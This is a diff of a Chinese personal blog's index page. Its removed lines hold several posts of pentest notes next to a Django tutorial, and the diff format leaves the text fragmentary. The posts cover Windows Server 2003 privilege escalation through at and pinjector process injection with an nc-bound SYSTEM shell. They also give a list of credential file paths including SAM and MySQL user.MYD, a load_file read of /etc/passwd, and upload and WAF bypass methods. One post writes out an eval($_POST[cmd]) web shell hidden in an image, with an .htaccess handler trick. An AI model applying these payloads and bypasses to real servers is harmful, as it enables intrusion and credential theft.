-<p>显示默认web地址和端口 ，更改端口只需在命令后面加上使用的端口号</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/12585049-19607cf2914561ef.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.png"></p>
-<h4 id="应用创建"><a href="#应用创建" class="headerlink" title="应用创建"></a>应用创建</h4><p>创建步骤：</p>
-<ol>
-<li>打开命令行，进入manage.py 的同级目录</li>
-<li>输入：python manage.py startapp blog</li>
-<li>添加应用名到 settings.py 中的 INSTALLED_APPS里</li>
-</ol>
-<ul>
-<li><p>应用目录结构</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">migrations     数据移植模块，内容自动生成</span><br><span class="line"></span><br><span class="line">admin.py       后台管理系统配置</span><br><span class="line"></span><br><span class="line">apps.py        该应用的一些配置，Django-1.9以后自动生成</span><br><span class="line"></span><br><span class="line">models.py      数据模块</span><br><span class="line"></span><br><span class="line">tests.py       自动化测试模块，可在此编写测试脚本</span><br><span class="line"></span><br><span class="line">views.py       执行响应的代码所在模块，代码逻辑处理主要地点，大部分代码在此编写</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>创建第一个响应页面</p>
-</li>
-</ul>
-<ol>
-<li>在 blog 的 views.py 编写代码并保存<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from django.shortcuts import render</span><br><span class="line"></span><br><span class="line">from django.http import HttpResponse</span><br><span class="line"></span><br><span class="line">def index(request):</span><br><span class="line"></span><br><span class="line">return HttpResponse(&apos;hello&apos;)</span><br></pre></td></tr></table></figure>
-</li>
-</ol>
-<p>注：每个响应对应一个函数，函数必须返回一个响应<br>函数必须存在一个参数，一般约定为 request<br>每一个响应函数对应一个URL</p>
-<ol start="2">
-<li>进入 myblog 的配置文件 settings.py，在 INSTALLED_APPS 中添加 blog 应用</li>
-<li>进入 myblog 的url配置文件 urls.py，导入模块并配置url</li>
-</ol>
-<ul>
-<li>URL 配置一<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import blog.views as asd</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line"></span><br><span class="line">url(r&apos;^admin/&apos;, admin.site.urls),</span><br><span class="line"></span><br><span class="line">url(r&apos;^index/&apos;, asd.index),</span><br><span class="line"></span><br><span class="line">]</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>注：URL函数有三个参数：URL（正则），对应方法，名称<br>URL函数存放在 urlpatterns 列表中</p>
-<ul>
-<li>URL配置二</li>
-</ul>
-<p>(1)  在 myblog 的 urls.py 中导入 include 模块，并在urlpatterns中添加url<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">from django.conf.urls import url,include</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line"></span><br><span class="line">url(r&apos;^index/&apos;, include(&apos;blog.urls&apos;)),</span><br><span class="line"></span><br><span class="line">]</span><br></pre></td></tr></table></figure></p>
-<p>(2) blog目录下创建urls.py 编写 url 访问方式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from django.conf.urls import url</span><br><span class="line"></span><br><span class="line">from . import views</span><br><span class="line"></span><br><span class="line">urlpatterns = [</span><br><span class="line"></span><br><span class="line">url(r&apos;^$&apos;, views.index),</span><br><span class="line"></span><br><span class="line">]</span><br></pre></td></tr></table></figure></p>
-<ol start="4">
-<li>启动服务器python manage.py runserver</li>
-<li>打开浏览器，访问 <a href="http://127.0.0.1:8000/index/" target="_blank" rel="noopener">http://127.0.0.1:8000/index/</a></li>
-</ol>
-<p><img src="https://upload-images.jianshu.io/upload_images/12585049-4b20e6314620a2da.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.png"></p>
+          Django 安装
+安装
+pip install Django==1.10.2
 
-          
+
+查看是否安装成功
+python -m django version
+
+
+创建新项目
+D:\python&gt;django-admin startproject myblog
+
+
+
+此时自建项目目录生成
+
+目录结构:
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/12/09/Django---简单博客搭建（Django安装）/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1235,36 +964,21 @@ if __name__==&quot;__main__&quot;:
       
         
           
-            <h3 id="Metasploit’Wmap-Web扫描器使用"><a href="#Metasploit’Wmap-Web扫描器使用" class="headerlink" title="Metasploit’Wmap Web扫描器使用"></a>Metasploit’Wmap Web扫描器使用</h3><p>第一次使用需要初始化并启动数据库</p>
-<p> <img src="https://upload-images.jianshu.io/upload_images/12585049-8567c6c0bd2769bd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.png"></p>
-<ol>
-<li>启动 metasploit<br> <code>root@kaili:~# msfconsole</code></li>
-<li><p>进入控制台，加载wmap模块<br> <code>msf &gt; load_wmap</code><br>成功加载如下图<br><img src="https://upload-images.jianshu.io/upload_images/12585049-9a444a6cbbad26b7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.png"></p>
-</li>
-<li><p>help 查看 wmap 参数<br> <code>msf &gt; help</code><br><img src="https://upload-images.jianshu.io/upload_images/12585049-2c272a073a60d745.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.png"></p>
-</li>
-<li><p>添加扫描站点<br> <code>msf &gt; wmap_sites -a http://X.X.X.X</code><br><img src="https://upload-images.jianshu.io/upload_images/12585049-8938c9110e5ab067.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.png"></p>
-</li>
-<li><p>查看扫描站点<br> <code>msf &gt; wmap_sites -l</code><br><img src="https://upload-images.jianshu.io/upload_images/12585049-4e208dc3d0843da4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="5.png"></p>
-</li>
-</ol>
-<p>若添加错误，删除站点可以用<br>    <code>msf &gt; wmap_sites -d &lt;Id&gt;</code></p>
-<ol start="6">
-<li><p>设置扫描站点<br> <code>msf &gt; wmap_targets -d &lt;Id&gt;</code><br><img src="https://upload-images.jianshu.io/upload_images/12585049-0ea5b511fb7c882b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.png"></p>
-</li>
-<li><p>查看扫描目标列表<br> <code>msf &gt; wmap_targets -l</code><br><img src="https://upload-images.jianshu.io/upload_images/12585049-32a1da0ed10680b3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="7.png"></p>
-</li>
-<li><p>载入扫描需要使用的 EXP 模块<br> <code>msf &gt; wmap_run -t</code><br><img src="https://upload-images.jianshu.io/upload_images/12585049-f944b66d16b640d6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.png"></p>
-<p> -m 参数和正则表达式使用可以选择使用模块</p>
-</li>
-<li><p>开始进行扫描<br> <code>msf &gt; wmap_run -e</code><br><img src="https://upload-images.jianshu.io/upload_images/12585049-b9719ee091d9e6a0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="9.png"></p>
-</li>
-<li><p>查看扫描结果汇总<br><code>msf &gt; wmap_vluns -l</code><br>或者可以直接使用 vluns 结果一样</p>
-</li>
-</ol>
-<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><p><hr> Wmap借助于Metasploit的模块扫描目标应用和主机的漏洞。它从Metasploit的数据库和模块中获取目标主机和应用的信息并将扫描结果返回给数据库。允许用户使用和配置Metasploit中的辅助模块，对网站进行集中扫描。</p>
+          Metasploit’Wmap Web扫描器使用第一次使用需要初始化并启动数据库
+ 
 
-          
+启动 metasploit root@kaili:~# msfconsole
+进入控制台，加载wmap模块 msf &gt; load_wmap成功加载如下图
+
+help 查看 wmap 参数 msf &gt; 
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/12/09/Web扫描器-Metasploit'-Wmap/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1404,50 +1118,20 @@ if __name__==&quot;__main__&quot;:
       
         
           
-            <h4 id="本地提权"><a href="#本地提权" class="headerlink" title="本地提权"></a>本地提权</h4><p>Administrator 提权至 System 权限</p>
-<p>测试机：Windows Sever 2003</p>
-<blockquote>
-<p>C:\Documents and Settings\Administrator&gt;at 10:31 /interactive cmd</p>
-</blockquote>
-<p>新加了一项作业，其作业 ID = 2 #10:31 启动cmd命令行<br><img src="https://upload-images.jianshu.io/upload_images/12585049-f59ed97eecdeb8f4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.png"></p>
-<p>cmd 权限变更为 system<br><img src="https://upload-images.jianshu.io/upload_images/12585049-f71183a3925a439f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.png"></p>
-<p>explorer.exe # 桌面进程 此时用户是Administrator</p>
-<p>结束进程后 利用 cmd 的 taskmgr 命令启动任务管理器 重新创建 explorer.exe 进程 此时用户已变更为 system</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/12585049-0d94583f275c7a89.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.png"></p>
-<h4 id="注入进程提权"><a href="#注入进程提权" class="headerlink" title="注入进程提权"></a>注入进程提权</h4><p>注入进程提权：相当于开了一个后门,隐蔽性极高,不会创建新的进程,很难发现，便于进行隐蔽的监听</p>
-<p>pinjector.exe程序下载地址：<a href="https://www.tarasco.org/security/Process_Injector/index.html" target="_blank" rel="noopener">https://www.tarasco.org/security/Process_Injector/index.html</a></p>
-<p>靶机：win server2003</p>
-<p>ip：192.168.195.129</p>
-<ol>
-<li>cmd 运行 pinjector.exe 程序</li>
-</ol>
-<blockquote>
-<p>pinjector # 参数及说明<br>pinjector -l # 列出当前执行的进程及其相应的用户名<br>pinjector -p pid cmd port # 对pid进程执行注入</p>
-</blockquote>
-<p><img src="https://upload-images.jianshu.io/upload_images/12585049-55b01b85d32da102.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.png"></p>
-<ol start="2">
-<li>查看当前进程及用户</li>
-</ol>
-<p><img src="https://upload-images.jianshu.io/upload_images/12585049-acf236f42d99b43d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="5.png"></p>
-<p>此时1234端口未被占用</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/12585049-eb1340dac2f40258.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.png"></p>
-<ol start="4">
-<li>选取进程进行注入</li>
-</ol>
-<blockquote>
-<p>pinjector -p 440 cmd 1234</p>
-</blockquote>
-<p><img src="https://upload-images.jianshu.io/upload_images/12585049-3624ca07bf1c9179.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="7.png"></p>
-<ol start="5">
-<li>再次查看1234端口发现被占用</li>
-</ol>
-<p><img src="https://upload-images.jianshu.io/upload_images/12585049-00531426642a0706.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.png"></p>
-<ol start="6">
-<li>同时kali中可以利用nc进行监听，获取system权限</li>
-</ol>
-<p><img src="https://upload-images.jianshu.io/upload_images/12585049-f51861f577ebb910.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="9.png"></p>
+          本地提权Administrator 提权至 System 权限
+测试机：Windows Sever 2003
 
-          
+C:\Documents and Settings\Administrator&gt;at 10:31 /interactive cmd
+
+新加了一项作业，其作业 ID = 2 #10:3
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/12/09/Windows-Sever-2003-提权/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1587,18 +1271,15 @@ if __name__==&quot;__main__&quot;:
       
         
           
-            <h4 id="一些-CMS-数据库安装配置信息"><a href="#一些-CMS-数据库安装配置信息" class="headerlink" title="一些 CMS 数据库安装配置信息"></a>一些 CMS 数据库安装配置信息</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">dedecms			/data/common.inc.php</span><br><span class="line">Discuz			/config_global_default.php、config /config_ucenter.php、config.inc.php</span><br><span class="line">PHPCMS V9		caches/configs/database.php</span><br></pre></td></tr></table></figure>
-<h4 id="一些常见的系统文件"><a href="#一些常见的系统文件" class="headerlink" title="一些常见的系统文件"></a>一些常见的系统文件</h4><ul>
-<li><p>Windows 下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">c:/boot.ini //查看系统版本 </span><br><span class="line">c:/windows/php.ini //php配置信息 </span><br><span class="line">c:/windows/my.ini //MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码 </span><br><span class="line">c:/winnt/php.ini </span><br><span class="line">c:/winnt/my.ini </span><br><span class="line">c:\mysql\data\mysql\user.MYD //存储了mysql.user表中的数据库连接密码 </span><br><span class="line">c:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini //存储了虚拟主机网站路径和密码 </span><br><span class="line">c:\Program Files\Serv-U\ServUDaemon.ini </span><br><span class="line">c:\windows\system32\inetsrv\MetaBase.xml 查看IIS的虚拟主机配置 </span><br><span class="line">c:\windows\repair\sam //存储了WINDOWS系统初次安装的密码 </span><br><span class="line">c:\Program Files\ Serv-U\ServUAdmin.exe //6.0版本以前的serv-u管理员密码存储于此 </span><br><span class="line">c:\Program Files\RhinoSoft.com\ServUDaemon.exe </span><br><span class="line">C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\*.cif文件 </span><br><span class="line">//存储了pcAnywhere的登陆密码 </span><br><span class="line">c:\Program Files\Apache Group\Apache\conf\httpd.conf 或C:\apache\conf\httpd.conf //查看WINDOWS系统apache文件 </span><br><span class="line">c:/Resin-3.0.14/conf/resin.conf //查看jsp开发的网站 resin文件配置信息. </span><br><span class="line">c:/Resin/conf/resin.conf /usr/local/resin/conf/resin.conf 查看linux系统配置的JSP虚拟主机 </span><br><span class="line">d:\APACHE\Apache2\conf\httpd.conf </span><br><span class="line">C:\Program Files\mysql\my.ini </span><br><span class="line">C:\mysql\data\mysql\user.MYD 存在MYSQL系统中的用户密码</span><br></pre></td></tr></table></figure>
-</li>
-<li><p>LUNIX/UNIX 下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">/usr/local/app/apache2/conf/httpd.conf //apache2缺省配置文件  </span><br><span class="line">/usr/local/apache2/conf/httpd.conf  </span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置  </span><br><span class="line">/usr/local/app/php5/lib/php.ini //PHP相关设置 </span><br><span class="line">/etc/sysconfig/iptables //从中得到防火墙规则策略  </span><br><span class="line">/etc/httpd/conf/httpd.conf // apache配置文件  </span><br><span class="line">/etc/rsyncd.conf //同步程序配置文件  </span><br><span class="line">/etc/my.cnf //mysql的配置文件  </span><br><span class="line">/etc/redhat-release //系统版本  </span><br><span class="line">/etc/issue  </span><br><span class="line">/etc/issue.net  </span><br><span class="line">/usr/local/app/php5/lib/php.ini //PHP相关设置 </span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置  </span><br><span class="line">/etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf 查看linux APACHE虚拟主机配置文件  </span><br><span class="line">/usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看  </span><br><span class="line">/usr/local/resin-pro-3.0.22/conf/resin.conf 同上  </span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看  </span><br><span class="line">/etc/httpd/conf/httpd.conf或/usr/local/apche/conf /httpd.conf 查看linux APACHE虚拟主机配置文件  </span><br><span class="line">/usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看  </span><br><span class="line">/usr/local/resin-pro-3.0.22/conf/resin.conf 同上  </span><br><span class="line">/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看  </span><br><span class="line">/etc/sysconfig/iptables 查看防火墙策略 </span><br><span class="line">load_file(char(47)) 可以列出FreeBSD,Sunos系统根目录 </span><br><span class="line">replace(load_file(0×2F6574632F706173737764),0×3c,0×20) </span><br><span class="line">replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))</span><br></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>参考链接：<a href="https://blog.csdn.net/m0_37438418/article/details/80289025" target="_blank" rel="noopener">https://blog.csdn.net/m0_37438418/article/details/80289025</a></p>
-
-          
+          一些 CMS 数据库安装配置信息123dedecms			/data/common.inc.phpDiscuz			/config_global_default.php、config /config_ucenter.php、config.inc.phpPHPCMS V9		caches/config
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/12/09/数据库信息/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1738,31 +1419,18 @@ if __name__==&quot;__main__&quot;:
       
         
           
-            <p>参考链接：<a href="https://xz.aliyun.com/t/1991" target="_blank" rel="noopener">https://xz.aliyun.com/t/1991</a></p>
-<h4 id="前端验证"><a href="#前端验证" class="headerlink" title="前端验证"></a>前端验证</h4><hr>
+          参考链接：https://xz.aliyun.com/t/1991
+前端验证
 
-<p>一般在网页上写一段<code>javascript</code>脚本，检验上传文件的后缀名，白名单或者黑名单形式<br>　　判断方法：浏览加载文件，但还未点击上传按钮时便弹出对话框，例：只允许上传<code>.jpg</code> <code>.jpeg</code> <code>.png</code>后缀名的文件，而此时并没有发送数据包<br>　　绕过方法：先上传 <code>.jpg</code>，burpsuite 抓包，将<code>.jpg</code>修改为 <code>.php</code> <code>.asp</code>等</p>
-<h4 id="服务端验证"><a href="#服务端验证" class="headerlink" title="服务端验证"></a>服务端验证</h4><hr>
-
-<ol>
-<li><p>文件名验证</p>
-<ul>
-<li>白名单绕过方法<br>　　一般通过解析漏洞构造，如 <code>%00截断</code>，<code>0x00截断</code>等。<br>　　参考链接： <a href="https://www.jianshu.com/p/224ac688d135" target="_blank" rel="noopener">https://www.jianshu.com/p/224ac688d135</a></li>
-<li>黑名单绕过方法<br>　　a. 找容易忽视的后缀名，例 <code>.cer</code> 等<br>　　b. 上传 <code>.htaccess</code><br>　　c. 后缀大小写绕过<br>　　d. 点绕过<br>　　e. 空格绕过<br>　　f. <code>::$DATA</code>绕过<br>　　g. 配合解析漏洞</li>
-</ul>
-</li>
-<li><p>文件内容验证<br>　　  a. 针对文件头 <code>content-type</code> 字段校验<code>（image/gif）</code>绕过方法<br>　　  b. 突破<code>getimagesize()</code><br>　　  c. 突破<code>exif_imagetype()</code><br>　　  d. 二次渲染</p>
-</li>
-<li><p>WAF 设备验证</p>
-</li>
-</ol>
-<ul>
-<li>垃圾数据<br>　　有些主机<code>WAF</code>软件为了不影响<code>web</code>服务器的性能，会对校验的用户数据设置大小上限，比如<code>1M</code>。此种情况可以构造一个大文件，前面<code>1M</code>的内容为垃圾内容，后面才是真正的木马内容，便可绕过WAF对文件内容的校验，也可将垃圾数据放在数据包最开头，绕过对文件名的校验</li>
-<li>filename<br>　　  可以参考文件名绕过方法，包括路径等等形式来对这个方法的限制进行绕过。可以考虑的点还有多个文件名，加入路径，利用重名命等。</li>
-<li>提交方法混淆<br>　　  有些<code>WAF</code>的规则是：如果数据包为<code>POST</code>类型，则校验数据包内容。<br>　　  此种情况可以上传一个<code>POST</code>型的数据包，抓包将<code>POST</code>改为<code>GET</code>。然后仍然传输<code>POST</code>的数据。<br>　　  利用<code>waf</code>本身缺陷删除实体里面的<code>Conten-Type</code>字段<br>　　  可以参考基与文件内容的绕过方法，可以利用多种形式对<code>Conten-Type</code>进行绕过。</li>
-</ul>
-
-          
+一般在网页上写一段javascript脚本，检验上传文件的后缀名，白名单或者黑名单形式　　判断方法：浏览加载文件，但还未点击上传按钮时便弹出对话框，例：只允许上传.jpg .jpeg .png后缀名的文件，而此时并没有发
+          ...
+          <!--noindex-->
+          <div class="post-button text-center">
+            <a class="btn" href="/2018/12/09/上传绕过/#more" rel="contents">
+              Read more &raquo;
+            </a>
+          </div>
+          <!--/noindex-->
         
       
     </div>
@@ -1902,36 +1570,18 @@ if __name__==&quot;__main__&quot;:
       
         
           
-            <h3 id="解析漏洞"><a href="#解析漏洞" class="headerlink" title="解析漏洞"></a>解析漏洞</h3><p>　　一些特殊文件被<code>IIS</code> <code>Apache</code> <code>Nginx</code>在某种情况下解析成脚本文件格式的漏洞</p>
-<h5 id="IIS-6-0解析漏洞"><a href="#IIS-6-0解析漏洞" class="headerlink" title="IIS 6.0解析漏洞"></a>IIS 6.0解析漏洞</h5><ol>
-<li><p>目录解析漏洞 <code>/xx.asp/xx.jpg</code></p>
-<p>在网站下创建文件夹名字为<code>.asp</code> <code>.asa</code>的文件夹，其目录内的任何扩展名的文件都被<code>iis</code>当做<code>asp</code>文件来解析并执行。因此只要攻击者可以通过该漏洞直接上传图片马，并且可以不需要改后缀名</p>
-</li>
-<li><p>文件解析 <code>xx.asp;.jpg</code></p>
-<p>在iis6.0下，分号后面的不被解析，所以<code>xx.asp;.jpg</code>被解析为<code>asp</code>脚本得以执行。</p>
-</li>
-<li><p>文件类型解析 <code>.asa</code> <code>.cer</code> <code>.cdx</code></p>
-<p>iis 6.0 默认的可执行文件除了<code>asp</code>还包含这三种<code>asa</code>、<code>cer</code>、<code>cdx</code></p>
-</li>
-</ol>
-<h5 id="IIS-7-0-IIS-7-5-Nginx-lt-0-8-37"><a href="#IIS-7-0-IIS-7-5-Nginx-lt-0-8-37" class="headerlink" title="IIS 7.0/IIS 7.5/Nginx &lt;=0.8.37"></a>IIS 7.0/IIS 7.5/Nginx &lt;=0.8.37</h5><p>   在默认<code>Fast-CGI</code>开启状况下,在一个文件路径<code>(/xx.jpg)</code>后面加上<code>/xx.[PHP]</code>会将 <code>/xx.jpg</code> <code>/xx.php</code> 解析为 <code>php</code> 文件。</p>
-<p>常用利用方法： 将一张图和一个写入后门代码的文本文件合并 将恶意文本写入图片的二进制代码之后，避免破坏图片文件头和尾<br>e.g.<br>　　copy xx.jpg/b + yy.txt/a xy.jpg<br>   <code>/b</code> 即二进制<code>[binary]</code>模式<br>   <code>/a</code> 即<code>ascii</code>模式，生成 <code>xx.jpg</code>正常图片文件</p>
-<p>   <code>yy.txt</code> 内容 <code>&lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_POST[cmd])?&gt;&#39;);?&gt;</code></p>
-<p>意思为写入一个内容为<code>&lt;?php eval($_POST[cmd])?&gt;</code> 名称为<code>shell.php</code>的文件</p>
-<p>找个地方上传<code>xy.jpg</code> ,然后找到 <code>xy.jpg</code> 的地址，在地址后加上 <code>/xx.php</code> 即可执行恶意文本。</p>
-<p>此时在图片目录下生成一句话木马 <code>shell.php</code> 密码 <code>cmd</code></p>
-<h5 id="Nginx-lt-0-8-37-解析漏洞"><a href="#Nginx-lt-0-8-37-解析漏洞" class="headerlink" title="Nginx &lt;=0.8.37 解析漏洞"></a>Nginx &lt;=0.8.37 解析漏洞</h5><p>在<code>Fast-CGI</code>关闭的情况下，<code>Nginx &lt;=0.8.37</code> 依然存在解析漏洞</p>
-<p>在一个文件路径<code>(/xx.jpg)</code>后面加上<code>%00.php</code>会将 <code>/xx.jpg%00.php</code> 解析为 <code>php</code> 文件。</p>
-<h5 id="Apache-解析漏洞"><a href="#Apache-解析漏洞" class="headerlink" title="Apache 解析漏洞"></a>Apache 解析漏洞</h5><p>后缀解析：<code>test.php.x1.x2.x3</code></p>
-<p>   Apache将从右至左开始判断后缀，若<code>x3</code>非可识别后缀，再判断<code>x2</code>，直到找到可识别后缀为止，然后将该可识别后缀进解析</p>
-<p><code>test.php.x1.x2.x3</code> 则会被解析为<code>php</code></p>
-<p><code>php|php3|phtml</code>多可被<code>Apache</code>解析</p>
-<p>Apache 是从右到左开始判断解析,如果为不可识别解析,就再往左判断.</p>
-<p>例 <code>cracer.php.owf.rar</code>中 <code>.owf</code>和<code>.rar</code>这两种后缀是apache不可识别解析,apache就会把<code>cracer.php.owf.rar</code>解析成<code>php</code></p>
-<p>如何判断是不是合法的后缀就是这个漏洞的利用关键,测试时可以尝试上传一个<code>cracer.php.rara.jpg.png…</code>（把知道的常见后缀都写上…）去测试是否是合法后缀。</p>
-<p>如果Apache中<code>.htaccess</code>可被执行并可被上传，那么可以尝试在<code>.htaccess</code>中写入<br>　　<figure class="highlight plain"><figcaption><span>"shell.jpg"> SetHandler application/x-httpd-php 　```</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">  然后再上传`shell.jpg`的木马，这样`shell.jpg`就可被解析为PHP文件了。</span><br><span class="line"></span><br><span class="line">    .htaccess文件是Apache服务器中的一个配置文件，负责相关目录下的网页配置。通过htaccess文件，可以实现：网页301重定向、自定义404错误页面、改变文件扩展名、允许/阻止特定的用户或者目录的访问、禁止目录列表、配置默认文档等功能IIS平台上不存在该文件，该文件默认开启，启用和关闭在httpd.conf文件中配置</span><br><span class="line"></span><br><span class="line">##### PHP CGI解析漏洞</span><br><span class="line"></span><br><span class="line">当php的配置文件中的选项cgi.fix_pathinfo = 1开启时，当访问`http://www.xxx.com/x.txt/x.php`时，若`x.php`不存在，则PHP会递归向前解析，将`x.txt`当作`php`脚本来解析</span><br><span class="line"></span><br><span class="line">IIS中：`任意文件名/任意文件名.php`就会被解析为`php`</span><br><span class="line"></span><br><span class="line">Nginx中：`任意文件名/任意文件名.php`就会被解析为`php`</span><br><span class="line"></span><br><span class="line">##### 操作系统解析</span><br><span class="line"></span><br><span class="line">  由于windows会将文件的后缀中的空格以及点进行过滤，如果遇到是黑名单校验的，如限制不允许上传PHP文件，而系统又是windows系统，那么我们可以上传`xx.php` ，或者`xx.php.`通过这种方式就可以绕过黑名单检验的文件上传</span><br><span class="line"></span><br><span class="line">##### 文件头欺骗漏洞</span><br><span class="line"></span><br><span class="line">在一句话木马前面加入`GIF89a`，然后将木马保存为图片格式，可以欺骗简单的`waf`。</span><br><span class="line"></span><br><span class="line">##### filepath漏洞</span><br><span class="line"></span><br><span 